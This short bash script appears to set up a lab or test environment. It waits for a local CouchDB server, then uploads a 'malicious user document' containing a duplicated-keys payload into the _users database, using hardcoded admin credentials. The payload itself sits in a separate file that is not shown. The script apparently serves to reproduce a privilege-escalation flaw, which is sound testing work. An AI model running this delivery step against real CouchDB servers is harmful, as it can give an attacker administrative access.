#!/bin/bash
# Wait for CouchDB to become healthy
until curl -s http://localhost:5984/_up | grep -q "couchdb is up"; do
  echo "Waiting for CouchDB..."
  sleep 2
done

# Create the malicious user document using the duplicated keys payload
curl -s -X PUT http://admin:secret@localhost:5984/_users/org.couchdb.user:eviluser \
  -H "Content-Type: application/json" \
  -d @/opt/couchdb/etc/local.d/evil_user.json

echo "Evil user created."
